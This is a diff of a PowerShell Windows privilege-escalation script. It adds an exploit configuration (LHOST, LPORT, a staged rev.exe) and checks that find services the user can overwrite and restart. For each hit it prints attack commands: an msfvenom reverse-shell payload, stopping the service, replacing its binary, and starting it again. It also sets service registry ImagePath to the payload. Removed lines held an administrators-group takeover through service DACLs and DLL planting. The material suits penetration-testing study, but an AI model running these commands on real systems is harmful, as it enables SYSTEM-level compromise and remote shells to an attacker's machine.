@@ -17,6 +17,12 @@ param([switch]$Extended, [switch]$Admin)
 
 $ErrorActionPreference = 'SilentlyContinue'
 
+#region ===== EXPLOIT CONFIG (edit before running) =====
+$LHOST = '<YOUR-IP>'
+$LPORT = '443'
+$STAGE = 'C:\Windows\Temp\rev.exe'
+#endregion
+
 #region ===== OUTPUT HELPERS =====
 $script:Total = 0; $script:Actionable = 0; $script:Lateral = 0
 $script:SeenBins = @{} # dedup writable binaries
@@ -731,51 +737,128 @@ $allServices | Where-Object {
     $sev = if ($writableDirs.Count -gt 0) { 'HIGH' } else { 'MED' }
     finding $sev "Unquoted path: $($svc.Name) [Start: $($svc.StartMode)]$(if($writableDirs){' - WRITABLE DIR!'})" `
         "Path: $($svc.PathName)`nRuns as: $($svc.StartName)$(if($writableDirs){"`nWritable: $($writableDirs -join ', ')"})" `
-        "1. Identify space-truncated path to abuse:`n   e.g. C:\Program Files\Vuln App\svc.exe -> drop C:\Program.exe`n2. msfvenom -p windows/x64/shell_reverse_tcp ... -f exe > Program.exe`n3. Copy to writable dir, restart service:`n   sc stop $($svc.Name)`n   sc start $($svc.Name)"
+        "1. Identify space-truncated path to abuse:`n   e.g. C:\Program Files\Vuln App\svc.exe -> drop C:\Program.exe`n2. msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev.exe`n3. Copy to writable dir, restart service:`n   sc.exe stop $($svc.Name)`n   sc.exe start $($svc.Name)"
 }
 if ($unquotedCount -eq 0) { info "No unquoted service paths." }
 
-sub "Writable service binaries"
-foreach ($svc in $allServices) {
-    $bin = Get-BinFromPath $svc.PathName
-    if (-not $bin -or -not (Test-Path $bin)) { continue }
-    if (Test-Writable $bin) {
-        finding-writable-bin 'service' $svc.Name $bin $svc.StartName "Start: $($svc.StartMode)" `
-            "sc stop $($svc.Name) & sc start $($svc.Name)"
-    }
+sub "Writable + restartable services (binary or directory)"
+
+$mySIDs = @($me.User.Value)
+$me.Groups | ForEach-Object { $mySIDs += $_.Value }
+
+$sddlMap = New-Object Collections.Hashtable
+$sddlMap['S-1-1-0']  = 'WD'
+$sddlMap['S-1-5-11'] = 'AU'
+$sddlMap['S-1-5-32-545'] = 'BU'
+$sddlMap['S-1-5-4']  = 'IU'
+$sddlMap['S-1-5-6']  = 'SU'
+$sddlMap['S-1-5-32-544'] = 'BA'
+$sddlMap['S-1-5-18'] = 'SY'
+
+$writeRights = [Security.AccessControl.FileSystemRights]::WriteData -bor `
+    [Security.AccessControl.FileSystemRights]::AppendData -bor `
+    [Security.AccessControl.FileSystemRights]::Write -bor `
+    [Security.AccessControl.FileSystemRights]::Modify -bor `
+    [Security.AccessControl.FileSystemRights]::FullControl -bor `
+    [Security.AccessControl.FileSystemRights]::ChangePermissions -bor `
+    [Security.AccessControl.FileSystemRights]::TakeOwnership
+
+function Test-WritableBySelf($path) {
+    if (-not (Test-Path $path)) { return $false }
+    try {
+        $acl = Get-Acl $path -ErrorAction Stop
+        foreach ($ace in $acl.Access) {
+            if ($ace.AccessControlType -ne 'Allow') { continue }
+            if (-not ($ace.FileSystemRights -band $writeRights)) { continue }
+            $id = $ace.IdentityReference
+            $sid = $null
+            try { $sid = $id.Translate([Security.Principal.SecurityIdentifier]).Value } catch {}
+            if (-not $sid) {
+                try {
+                    $nt = New-Object Security.Principal.NTAccount($id.Value)
+                    $sid = $nt.Translate([Security.Principal.SecurityIdentifier]).Value
+                } catch {}
+            }
+            if ($sid -and $sid -in $mySIDs) { return $true }
+        }
+    } catch {}
+    return $false
 }
 
-sub "Writable service directories (DLL plant)"
-$writableSvcDirCount = 0
+function Test-SvcRestartable($svcName) {
+    try {
+        $sd = sc.exe sdshow $svcName 2>$null | Out-String
+        if (-not $sd) { return $false }
+    } catch { return $false }
+
+    $myTokens = @()
+    foreach ($s in $mySIDs) {
+        if ($sddlMap.ContainsKey($s)) { $myTokens += $sddlMap[$s] }
+        $myTokens += $s
+    }
+
+    $acePattern = '\(A;;([^;]*);*;;;([^)]+)\)'
+    $canStart = $false; $canStop = $false
+    foreach ($m in [regex]::Matches($sd, $acePattern)) {
+        $rights = $m.Groups[1].Value
+        $trustee = $m.Groups[2].Value
+
+        $matched = $false
+        foreach ($tok in $myTokens) {
+            if ($trustee -eq $tok) { $matched = $true; break }
+        }
+        if (-not $matched) { continue }
+
+        $tokens = @(); for ($i = 0; $i -lt $rights.Length; $i += 2) {
+            if ($i + 1 -lt $rights.Length) { $tokens += $rights.Substring($i, 2) }
+        }
+        if ('GA' -in $tokens -or 'FA' -in $tokens) { $canStart = $true; $canStop = $true; break }
+        if ($rights -match '0x[0-9a-fA-F]+') {
+            $hex = [convert]::ToInt64(($rights -replace '.*?(0x[0-9a-fA-F]+).*','$1'), 16)
+            if ($hex -band 0x10) { $canStart = $true }
+            if ($hex -band 0x20) { $canStop = $true }
+        }
+        if ('RP' -in $tokens) { $canStart = $true }
+        if ('WP' -in $tokens) { $canStop = $true }
+        if ($canStart -and $canStop) { break }
+    }
+    return ($canStart -and $canStop)
+}
+
+$svcHitCount = 0
 foreach ($svc in $allServices) {
     $bin = Get-BinFromPath $svc.PathName
     if (-not $bin) { continue }
-    $dir = Split-Path $bin -Parent -ErrorAction SilentlyContinue
-    if (-not $dir -or $dir -match '^C:\\Windows\\System32' -or $dir -match '^C:\\Windows\\SysWOW64') { continue }
-    if ((Test-Path $dir) -and (Test-WritableDir $dir) -and -not (Test-Writable $bin)) {
-        $writableSvcDirCount++
-        finding 'HIGH' "Writable service dir: $($svc.Name)" `
-            "Dir: $dir`nBinary: $bin`nRuns as: $($svc.StartName)" `
-            "1. Use procmon to find missing DLLs loaded by $bin`n2. Place malicious DLL in $dir`n3. sc stop $($svc.Name) & sc start $($svc.Name)"
-    }
-}
-if ($writableSvcDirCount -eq 0) { info "No writable service directories (excluding system dirs)." }
+    if ($bin -match '^C:\\Windows\\System32\\' -or $bin -match '^C:\\Windows\\SysWOW64\\') { continue }
 
-# --- MOVED from Extended to default: Service DACL check ---
-sub "Modifiable service DACLs"
-$modifiableSvcCount = 0
-foreach ($svc in ($allServices | Select-Object -First 80)) {
-    try {
-        $sd = sc.exe sdshow $svc.Name 2>$null | Out-String
-        if ($sd -match '\(A;;[^;]*?(DC|WD|CC|WP|GA)[^;]*?;;;(BU|AU|WD)\)') {
-            $modifiableSvcCount++
-            finding 'HIGH' "Modifiable service DACL: $($svc.Name)" `
-                "Runs as: $($svc.StartName)" `
-                ('sc config ' + $svc.Name + ' binpath= "cmd /c net localgroup administrators ' + $myName + ' /add"' + "`nsc stop " + $svc.Name + "`nsc start " + $svc.Name)
+    $binWritable = $false; $dirWritable = $false; $writableTarget = $null
+    if ((Test-Path $bin) -and (Test-WritableBySelf $bin)) {
+        $binWritable = $true; $writableTarget = $bin
+    }
+    if (-not $binWritable) {
+        $dir = Split-Path $bin -Parent -ErrorAction SilentlyContinue
+        if ($dir -and (Test-Path $dir) -and (Test-WritableBySelf $dir)) {
+            $dirWritable = $true; $writableTarget = $dir
         }
-    } catch {}
+    }
+    if (-not $binWritable -and -not $dirWritable) { continue }
+
+    if (-not (Test-SvcRestartable $svc.Name)) { continue }
+
+    $svcHitCount++
+    $wType = if ($binWritable) { 'exe' } else { 'folder' }
+    $acct = $svc.StartName
+    hit "$($svc.Name)  ($acct)  ->  $bin" `
+        "writable: $writableTarget ($wType)   restart: yes (stop+start)" `
+        ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o rev.exe`n" + `
+         "sc.exe stop $($svc.Name)`n" + `
+         "sc.exe query $($svc.Name)        :: wacht op STOPPED`n" + `
+         "copy /Y $STAGE `"$bin`"`n" + `
+         "sc.exe start $($svc.Name)")
 }
-if ($modifiableSvcCount -eq 0) { info "No modifiable service DACLs found." }
+if ($svcHitCount -eq 0) {
+    Write-Host "  [-] Geen service die je kan schrijven EN herstarten." -ForegroundColor DarkGray
+}
 
 if ($Extended) {
     sub "Writable service registry keys (Extended)"
@@ -785,7 +868,7 @@ if ($Extended) {
             $writableRegCount++
             $svcName = $_.PSChildName
             finding 'HIGH' "Writable service reg key: $svcName" "Key: $($_.PSPath)" `
-                "reg add `"HKLM\SYSTEM\CurrentControlSet\Services\$svcName`" /v ImagePath /t REG_EXPAND_SZ /d `"C:\path\payload.exe`" /f`nsc start $svcName"
+                "reg add `"HKLM\SYSTEM\CurrentControlSet\Services\$svcName`" /v ImagePath /t REG_EXPAND_SZ /d `"$STAGE`" /f`nsc.exe start $svcName"
         }
     }
     if ($writableRegCount -eq 0) { info "No writable service registry keys." }
